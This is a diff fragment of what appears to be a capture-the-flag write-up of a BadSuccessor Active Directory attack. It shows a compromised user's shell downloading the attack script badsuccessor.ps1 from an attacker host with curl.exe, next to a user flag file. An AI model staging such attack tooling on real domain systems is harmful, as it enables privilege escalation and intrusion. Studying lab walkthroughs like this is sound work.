@@ -981,3 +981,31 @@ BADSUCCE... 10.129.83.74    389    DC01             ryan.brooks (S-1-5-21-312916
 ╰─                                                                                                                   ─╯
 
 ```
+
+``` bash
+
+
+C:\Users\ryan.brooks\Desktop>curl.exe "http://10.10.15.166:8080/badsuccessor.ps1" -o "badsuccessor.ps1"
+curl.exe "http://10.10.15.166:8080/badsuccessor.ps1" -o "badsuccessor.ps1"
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   822  100   822    0     0   9592      0 --:--:-- --:--:-- --:--:--  9670
+
+C:\Users\ryan.brooks\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 2660-795C
+
+ Directory of C:\Users\ryan.brooks\Desktop
+
+08/28/2026  05:55 PM    <DIR>          .
+05/21/2026  04:19 PM    <DIR>          ..
+08/28/2026  05:55 PM               822 badsuccessor.ps1
+08/28/2026  05:06 PM                34 user.txt
+               2 File(s)            856 bytes
+               2 Dir(s)  10,052,120,576 bytes free
+
+C:\Users\ryan.brooks\Desktop>
+
+
+```
